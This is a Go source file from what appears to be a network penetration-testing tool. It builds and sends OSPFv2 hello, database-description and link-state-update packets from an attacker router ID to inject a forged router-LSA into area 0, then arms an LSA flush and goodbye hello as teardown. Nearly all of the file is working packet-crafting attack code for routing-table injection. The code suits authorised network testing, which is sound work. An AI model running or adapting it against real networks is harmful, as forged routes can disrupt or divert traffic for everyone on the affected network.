// OSPF models a fixed hello, database-description, and LSA-update sequence.
// The runner executes the armed flush and goodbye frames after the behavior
// returns. Packet bytes are fixture data; adjacency and restoration are unverified.

package routing

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

// OSPF header fixed sizes.
const (
	ospfHeaderLen    = 24 // OSPFv2 header (version + type + length + routerID + areaID + checksum + autype + auth)
	ospfHelloBodyLen = 20 // network mask + hello interval + options + priority + dead interval + DR + BDR
	ospfLSAHeaderLen = 20
)

// ospfFinding is the finding detail for the OSPF behavior.
type ospfFinding struct {
	Action    string `json:"action"`
	RouterID  string `json:"router_id"`
	AreaID    string `json:"area_id"`
	LSAType   string `json:"lsa_type"`
	InjectSeq uint32 `json:"inject_seq"`
	FlushSeq  uint32 `json:"flush_seq"`
	Restore   string `json:"restore"`
}

// RunOSPF sends the fixture's hello, database description, and LSA update,
// with a flush and goodbye teardown armed before the first frame.
//
// It requires runner-provided dependencies. A missing hello is tolerated
// after 100 ms; a receive or decode failure stops the sequence. Cancellation
// returns ctx.Err(). Findings describe transmitted frames, not a confirmed
// adjacency. Concurrent calls require separate dependencies.
func RunOSPF(ctx context.Context, deps runner.Deps) error {
	if err := ctx.Err(); err != nil {
		return err
	}
	src := srcMAC()
	routerID := attackerRouterID
	areaID := uint32(0) // backbone area 0.0.0.0

	// Arm the teardown before the first frame.
	// Teardown step 1 (least-dependent): flush the injected LSA with a
	// matching sequence and LSAge=3600. Removal is not verified.
	flushPkt, err := craftLSAFlush(src, routerID, areaID)
	if err != nil {
		return fmt.Errorf("ospf: craft flush: %w", err)
	}
	deps.Teardown.Arm("ospf-lsa-flush", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, flushPkt)
	})

	// Teardown step 2: goodbye hello — an OSPF hello with no neighbors
	// listed, which drives the adjacency to reset.
	goodbyePkt, err := craftOSPFHello(src, routerID, areaID, nil)
	if err != nil {
		return fmt.Errorf("ospf: craft goodbye: %w", err)
	}
	deps.Teardown.Arm("ospf-goodbye", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, goodbyePkt)
	})

	// Phase 1: Hello.
	helloPkt, err := craftOSPFHello(src, routerID, areaID, nil)
	if err != nil {
		return fmt.Errorf("ospf: craft hello: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("ospf: send hello: %w", err)
	}

	// Phase 2: receive the target's hello (adjacency formation).
	// The fixture feeds the target's hello via PushRX. We read it with
	// a short timeout — in the in-memory harness, a missing RX frame is
	// not fatal; the behavior proceeds with the inject.
	rxCtx, rxCancel := context.WithTimeout(ctx, 100*time.Millisecond)
	_, rxErr := recvOSPF(rxCtx, deps.AttackLeg)
	rxCancel()
	if err := ctx.Err(); err != nil {
		return err
	}
	if rxErr != nil && !errors.Is(rxErr, context.DeadlineExceeded) {
		return rxErr
	}

	// Phase 3: Database Description.
	dbDescPkt, err := craftDBDesc(src, routerID, areaID)
	if err != nil {
		return fmt.Errorf("ospf: craft db desc: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, dbDescPkt); err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("ospf: send db desc: %w", err)
	}

	// Phase 4: LSA Update (inject route).
	injectSeq := uint32(0x80000001) // Fixture sequence
	lsaUpdatePkt, err := craftLSAUpdate(src, routerID, areaID, injectSeq)
	if err != nil {
		return fmt.Errorf("ospf: craft lsa update: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, lsaUpdatePkt); err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("ospf: send lsa update: %w", err)
	}

	// Emit the finding.
	detail := ospfFinding{
		Action:    "ospf-lsa-inject",
		RouterID:  ipToRouterID(routerID),
		AreaID:    ipToRouterID(areaID),
		LSAType:   "router-LSA",
		InjectSeq: injectSeq,
		FlushSeq:  0x80000001,
		Restore:   "goodbye/flush teardown",
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("ospf", detailBytes)

	return nil
}

// recvOSPF reads one frame from the leg and attempts to decode it as an
// OSPF packet. Returns the decoded OSPFv2 layer, or an error if no frame
// arrives or the decode fails.
func recvOSPF(ctx context.Context, leg link.Leg) (*layers.OSPFv2, error) {
	ch := leg.Receive(ctx)
	select {
	case f, ok := <-ch:
		if err := ctx.Err(); err != nil {
			return nil, err
		}
		if !ok {
			return nil, fmt.Errorf("ospf: receive: %w", io.EOF)
		}
		if f.Err != nil {
			return nil, fmt.Errorf("ospf: receive: %w", f.Err)
		}
		// Decode: skip Ethernet + IPv4 to reach OSPF payload.
		pkt := gopacket.NewPacket(f.Data, layers.LayerTypeEthernet, gopacket.Default)
		if ospfLayer := pkt.Layer(layers.LayerTypeOSPF); ospfLayer != nil {
			if ospf, ok := ospfLayer.(*layers.OSPFv2); ok {
				return ospf, nil
			}
		}
		return nil, fmt.Errorf("ospf: no OSPF layer in frame")
	case <-ctx.Done():
		return nil, ctx.Err()
	}
}

// craftOSPFHello builds an OSPFv2 Hello packet: Ethernet → IPv4 (proto 89) →
// OSPF hello. The neighbors list is the list of router IDs seen (empty for
// initial hello and goodbye).
func craftOSPFHello(src net.HardwareAddr, routerID, areaID uint32, neighbors []uint32) ([]byte, error) {
	// OSPF header
	hdr := make([]byte, ospfHeaderLen)
	hdr[0] = 2 // version 2
	hdr[1] = byte(layers.OSPFHello)
	// PacketLength: set after body
	binary.BigEndian.PutUint32(hdr[4:8], routerID)
	binary.BigEndian.PutUint32(hdr[8:12], areaID)
	// AuType=0, Authentication=0 (no auth) at [14:24].

	// Hello body
	body := make([]byte, ospfHelloBodyLen)
	binary.BigEndian.PutUint32(body[0:4], 0xffffff00) // network mask /24
	binary.BigEndian.PutUint16(body[4:6], 10)         // hello interval 10s
	body[6] = 0x02                                    // options: E bit
	body[7] = 1                                       // priority
	binary.BigEndian.PutUint32(body[8:12], 40)        // dead interval 40s
	binary.BigEndian.PutUint32(body[12:16], 0)        // DR
	binary.BigEndian.PutUint32(body[16:20], 0)        // BDR
	// Neighbors
	for _, n := range neighbors {
		nb := make([]byte, 4)
		binary.BigEndian.PutUint32(nb, n)
		body = append(body, nb...)
	}

	// Set packet length
	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))

	payload := append([]byte(nil), hdr...)
	payload = append(payload, body...)

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       ospfMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(89), // OSPF
		SrcIP:    attackerIP,
		DstIP:    ospfAllSPFRouters,
	}
	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
	return craft.Default(eth, ip, gopacket.Payload(payload))
}

// ospfChecksum computes the OSPFv2 packet checksum (RFC 2328 section D.4): the
// standard 16-bit ones-complement Internet checksum over the whole packet with
// the checksum field zero and the 64-bit authentication field ([16:24])
// excluded.
func ospfChecksum(p []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(p); i += 2 {
		if i == 12 || (i >= 16 && i < 24) {
			continue // checksum field and 64-bit auth field are excluded
		}
		sum += uint32(p[i])<<8 | uint32(p[i+1])
	}
	if len(p)%2 == 1 {
		sum += uint32(p[len(p)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// ospfLSAChecksum computes the RFC 2328 section 12.1.7 Fletcher checksum.
// LS age is excluded because routers update it in transit.
func ospfLSAChecksum(lsa []byte) uint16 {
	const checksumOffset = 16

	var c0, c1 int
	for i := 2; i < len(lsa); i++ {
		octet := int(lsa[i])
		if i == checksumOffset || i == checksumOffset+1 {
			octet = 0
		}
		c0 = (c0 + octet) % 255
		c1 = (c1 + c0) % 255
	}

	x := ((len(lsa)-checksumOffset-1)*c0 - c1) % 255
	if x <= 0 {
		x += 255
	}
	y := 510 - c0 - x
	if y > 255 {
		y -= 255
	}
	return uint16(x)<<8 | uint16(y)
}

// craftDBDesc builds an OSPFv2 Database Description packet.
func craftDBDesc(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) {
	hdr := make([]byte, ospfHeaderLen)
	hdr[0] = 2 // version 2
	hdr[1] = byte(layers.OSPFDatabaseDescription)
	binary.BigEndian.PutUint32(hdr[4:8], routerID)
	binary.BigEndian.PutUint32(hdr[8:12], areaID)

	// DB Desc body: MTU(2) + Options(1) + Flags(1) + DDSeq(4) = 8 bytes
	body := make([]byte, 8)
	binary.BigEndian.PutUint16(body[0:2], 1500) // interface MTU
	body[2] = 0x02                              // options: E bit
	body[3] = 0x07                              // flags: I=1, M=1, MS=1 (init, more, master)
	binary.BigEndian.PutUint32(body[4:8], 1)    // DD sequence number

	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))

	payload := append([]byte(nil), hdr...)
	payload = append(payload, body...)

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       ospfMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(89),
		SrcIP:    attackerIP,
		DstIP:    ospfAllSPFRouters,
	}
	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
	return craft.Default(eth, ip, gopacket.Payload(payload))
}

// craftLSAUpdate builds an OSPFv2 Link State Update carrying one router-LSA
// that injects a route. The LSA uses the given sequence number.
func craftLSAUpdate(src net.HardwareAddr, routerID, areaID, seq uint32) ([]byte, error) {
	hdr := make([]byte, ospfHeaderLen)
	hdr[0] = 2 // version 2
	hdr[1] = byte(layers.OSPFLinkStateUpdate)
	binary.BigEndian.PutUint32(hdr[4:8], routerID)
	binary.BigEndian.PutUint32(hdr[8:12], areaID)

	// LS Update body: NumLSAs(4) + LSA
	body := make([]byte, 4)
	binary.BigEndian.PutUint32(body, 1) // 1 LSA

	// Router-LSA: header(20) + body(flags(1) + links(2) + link1(12))
	lsaHeader := make([]byte, ospfLSAHeaderLen)
	binary.BigEndian.PutUint16(lsaHeader[0:2], 1)         // LSAge=1s
	lsaHeader[2] = 0x02                                   // options: E bit
	lsaHeader[3] = byte(layers.RouterLSAtypeV2)           // LSA type: router-LSA
	binary.BigEndian.PutUint32(lsaHeader[4:8], routerID)  // Link State ID
	binary.BigEndian.PutUint32(lsaHeader[8:12], routerID) // Advertising Router
	binary.BigEndian.PutUint32(lsaHeader[12:16], seq)     // LS Sequence Number
	// Length at [18:20] — set below

	// Router-LSA body: flags(1) + 0(1) + numLinks(2) + link(12)
	lsaBody := make([]byte, 4+12)
	lsaBody[0] = 0x00 // flags: no V, no E, no B
	lsaBody[1] = 0x00
	binary.BigEndian.PutUint16(lsaBody[2:4], 1) // 1 link
	// Link: LinkID(4) + LinkData(4) + Type(1) + 0(1) + Metric(2)
	binary.BigEndian.PutUint32(lsaBody[4:8], routerID)    // Link ID = our router ID
	binary.BigEndian.PutUint32(lsaBody[8:12], 0xffffff00) // Link Data = mask
	lsaBody[12] = 3                                       // Type: stub network
	lsaBody[13] = 0
	binary.BigEndian.PutUint16(lsaBody[14:16], 10) // metric

	lsaLen := uint16(len(lsaHeader) + len(lsaBody))
	binary.BigEndian.PutUint16(lsaHeader[18:20], lsaLen)

	lsa := lsaHeader
	lsa = append(lsa, lsaBody...)
	binary.BigEndian.PutUint16(lsa[16:18], ospfLSAChecksum(lsa))
	body = append(body, lsa...)

	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))

	payload := append([]byte(nil), hdr...)
	payload = append(payload, body...)

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       ospfMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(89),
		SrcIP:    attackerIP,
		DstIP:    ospfAllSPFRouters,
	}
	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
	return craft.Default(eth, ip, gopacket.Payload(payload))
}

// craftLSAFlush builds an OSPFv2 Link State Update carrying one router-LSA
// with LSAge=3600 and the fixture sequence number. The runner sends this
// during teardown; no acknowledgment or LSDB state is checked.
func craftLSAFlush(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) {
	hdr := make([]byte, ospfHeaderLen)
	hdr[0] = 2
	hdr[1] = byte(layers.OSPFLinkStateUpdate)
	binary.BigEndian.PutUint32(hdr[4:8], routerID)
	binary.BigEndian.PutUint32(hdr[8:12], areaID)

	body := make([]byte, 4)
	binary.BigEndian.PutUint32(body, 1) // 1 LSA

	// Flush LSA: LSAge=3600 and the fixture sequence.
	lsaHeader := make([]byte, ospfLSAHeaderLen)
	binary.BigEndian.PutUint16(lsaHeader[0:2], 3600) // maxAge
	lsaHeader[2] = 0x02
	lsaHeader[3] = byte(layers.RouterLSAtypeV2)
	binary.BigEndian.PutUint32(lsaHeader[4:8], routerID)
	binary.BigEndian.PutUint32(lsaHeader[8:12], routerID)
	binary.BigEndian.PutUint32(lsaHeader[12:16], 0x80000001)       // Fixture sequence
	binary.BigEndian.PutUint16(lsaHeader[18:20], ospfLSAHeaderLen) // length = header only
	binary.BigEndian.PutUint16(lsaHeader[16:18], ospfLSAChecksum(lsaHeader))

	body = append(body, lsaHeader...)

	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))

	payload := append([]byte(nil), hdr...)
	payload = append(payload, body...)

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       ospfMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(89),
		SrcIP:    attackerIP,
		DstIP:    ospfAllSPFRouters,
	}
	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
	return craft.Default(eth, ip, gopacket.Payload(payload))
}

// ipToRouterID formats a uint32 router ID as a dotted-quad string.
func ipToRouterID(id uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d", id>>24&0xff, id>>16&0xff, id>>8&0xff, id&0xff)
}
